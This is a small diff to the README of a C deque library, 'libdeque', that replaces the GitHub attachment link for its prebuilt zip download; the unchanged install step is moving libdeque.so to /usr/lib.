@@ -2,7 +2,7 @@
 A shared library which provides a set of functions for handling dynamic deques in C.
 
 <h2>How to download?</h2>
-You can download it <a href="https://github.com/user-attachments/files/20214559/libdeque.zip">here</a>
+You can download it <a href="https://github.com/user-attachments/files/20232167/libdeque.zip">here</a>
 
 <h2>How to install?</h2>
 Unzip the downloaded file and move libdeque.so to /usr/lib
